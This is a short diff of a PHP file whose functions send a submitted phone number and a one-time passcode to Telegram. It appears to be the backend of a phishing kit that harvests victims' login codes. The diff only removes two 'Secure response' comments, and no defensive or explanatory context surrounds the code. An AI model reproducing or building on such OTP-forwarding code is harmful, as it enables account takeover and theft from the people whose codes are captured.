@@ -60,7 +60,7 @@ function sendPhoneToTelegram() {
              . "`" . htmlspecialchars($phone, ENT_QUOTES, 'UTF-8') . "`";
 
     sendTelegramMessage($message);
-    exit(json_encode(["step" => "code"])); // Secure response
+    exit(json_encode(["step" => "code"])); 
 }
 
 function sendOtpToTelegram() {
@@ -78,7 +78,7 @@ function sendOtpToTelegram() {
              . "`" . htmlspecialchars($otp, ENT_QUOTES, 'UTF-8') . "`";
 
     sendTelegramMessage($message);
-    exit(json_encode(["status" => "success"])); // Secure response
+    exit(json_encode(["status" => "success"])); 
 }
 
 function sendTelegramMessage($message) {
